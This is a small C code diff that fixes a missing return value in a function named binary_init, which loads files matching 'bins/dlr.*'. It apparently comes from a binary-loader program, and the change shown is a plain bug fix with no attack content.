@@ -16,7 +16,7 @@ BOOL binary_init(void)
     if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
     {
         printf("Failed to load from bins folder!\n");
-        return;
+        return FALSE;
     }
 
     for (i = 0; i < pglob.gl_pathc; i++)
